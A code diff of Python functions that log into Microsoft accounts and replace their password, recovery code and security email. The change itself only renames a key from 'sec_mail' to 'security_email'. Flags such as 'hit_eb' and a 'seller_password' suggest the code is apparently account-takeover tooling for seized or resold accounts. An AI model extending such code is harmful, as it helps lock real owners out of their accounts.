@@ -90,7 +90,7 @@ async def _secure_after_password_login(
             return _failure_result(
                 email,
                 "Account is Family Locked.",
-                sec_mail=rextra.get("sec_mail"),
+                sec_mail=rextra.get("security_email"),
                 password=password,
                 rec_code=rextra.get("rec_code"),
             )
@@ -129,7 +129,7 @@ async def _secure_after_password_login(
                 email,
                 # Keep the historical reason string; fallback_otp drives retry.
                 "Password login did not establish an MSAAUTH sesja.",
-                sec_mail=rextra.get("sec_mail"),
+                sec_mail=rextra.get("security_email"),
                 password=password,
                 rec_code=rextra.get("rec_code"),
                 error=hint,
@@ -150,7 +150,7 @@ async def _secure_after_password_login(
     acct = {
         "microsoft": {
             "email": email,
-            "sec_mail": rextra.get("sec_mail", "Couldn't Change!"),
+            "sec_mail": rextra.get("security_email", "Couldn't Change!"),
             "password": password,
             "rec_code": rextra.get("rec_code", "Couldn't Change!"),
             "auth_secret": "Disabled",
@@ -193,8 +193,8 @@ async def _secure_after_password_login(
             email,
             reject,
             sec_mail=(
-                secured_ms.get("sec_mail")
-                or rextra.get("sec_mail")
+                secured_ms.get("security_email")
+                or rextra.get("security_email")
             ),
             password=secured_ms.get("password") or password,
             rec_code=(
@@ -216,8 +216,8 @@ async def _secure_after_password_login(
             email,
             ban_reject,
             sec_mail=(
-                secured_ms.get("sec_mail")
-                or rextra.get("sec_mail")
+                secured_ms.get("security_email")
+                or rextra.get("security_email")
             ),
             password=secured_ms.get("password") or password,
             rec_code=(
@@ -832,8 +832,8 @@ async def romeo_recover(
                     # Re-wrapping via _failure_result without primary_email was wiping it.
                     if account.get("hit_eb") or account.get("sell_eb"):
                         ms = account.get("microsoft") or {}
-                        if not ms.get("sec_mail") and sec_mail:
-                            ms["sec_mail"] = sec_mail
+                        if not ms.get("security_email") and sec_mail:
+                            ms["security_email"] = sec_mail
                         if not ms.get("password") and password:
                             ms["password"] = password
                         if not ms.get("rec_code") and new_recovery_code:
@@ -848,7 +848,7 @@ async def romeo_recover(
                             "reason",
                             "Login or securing failed after recovery code reset.",
                         ),
-                        sec_mail=ms.get("sec_mail") or sec_mail,
+                        sec_mail=ms.get("security_email") or sec_mail,
                         password=ms.get("password") or password,
                         rec_code=ms.get("rec_code") or new_recovery_code,
                         error=account.get("error") or account.get("reason"),
@@ -977,7 +977,7 @@ async def romeo_recover(
                     if prior:
                         ms = account["microsoft"]
                         prior_rc = str(prior.get("rec_code") or "").strip()
-                        prior_sec = str(prior.get("sec_mail") or "").strip()
+                        prior_sec = str(prior.get("security_email") or "").strip()
                         prior_pwd = str(prior.get("password") or "").strip()
                         if prior_rc and prior_rc not in (
                             "Couldn't Change!",
@@ -989,7 +989,7 @@ async def romeo_recover(
                                 f"({prior_rc[:8]}…)"
                             )
                         if prior_sec and "@" in prior_sec and prior_sec != "Couldn't Change!":
-                            ms["sec_mail"] = prior_sec
+                            ms["security_email"] = prior_sec
                             print(f"[~] - Seeded prior security email from DB ({prior_sec})")
                         # Seller TOTP password may be stale after a prior RecoverUser —
                         # keep seller_password for login, but stash secured pwd for MFA.
@@ -1070,8 +1070,8 @@ async def romeo_recover(
                             not in ("Couldn't Change!", "Failed to generate", None)
                         )
                         or bool(
-                            ms.get("sec_mail")
-                            and ms.get("sec_mail") not in ("Couldn't Change!", None)
+                            ms.get("security_email")
+                            and ms.get("security_email") not in ("Couldn't Change!", None)
                         )
                         or replaced
                     )
@@ -1084,7 +1084,7 @@ async def romeo_recover(
                     return _failure_result(
                         email,
                         f"Securing step failed: {reason}",
-                        sec_mail=ms.get("sec_mail") if creds_changed else None,
+                        sec_mail=ms.get("security_email") if creds_changed else None,
                         password=ms.get("password") if creds_changed else seller_password,
                         rec_code=ms.get("rec_code") if creds_changed else None,
                         error=reason,
@@ -1109,7 +1109,7 @@ async def romeo_recover(
 
                 ms = dsecured.get("microsoft") or {}
                 new_rc = str(ms.get("rec_code") or "").strip()
-                new_sec = str(ms.get("sec_mail") or "").strip()
+                new_sec = str(ms.get("security_email") or "").strip()
                 new_pwd = str(ms.get("password") or "").strip()
                 creds_ready = (
                     new_rc
@@ -1135,7 +1135,7 @@ async def romeo_recover(
                     return _failure_result(
                         email,
                         reject,
-                        sec_mail=ms.get("sec_mail"),
+                        sec_mail=ms.get("security_email"),
                         password=ms.get("password") or seller_password,
                         rec_code=ms.get("rec_code"),
                         creds_moved=True,
@@ -1151,7 +1151,7 @@ async def romeo_recover(
                     return _failure_result(
                         email,
                         ban_reject,
-                        sec_mail=ms.get("sec_mail"),
+                        sec_mail=ms.get("security_email"),
                         password=ms.get("password") or seller_password,
                         rec_code=ms.get("rec_code"),
                         creds_moved=True,
@@ -1168,7 +1168,7 @@ async def romeo_recover(
                         "Securing failed — recovery code / security email were not set.",
                         password=ms.get("password") or seller_password,
                         rec_code=ms.get("rec_code"),
-                        sec_mail=ms.get("sec_mail"),
+                        sec_mail=ms.get("security_email"),
                         error="authpwd secure did not produce new credentials",
                         creds_moved=replaced,
                         primary_email=primary,
